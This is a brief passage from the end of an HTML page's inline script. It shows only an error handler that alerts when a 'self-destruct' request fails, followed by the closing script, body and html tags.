  }).catch(e => alert('Self-destruct request failed: ' + e.message));
}

</script>
</body>
</html>
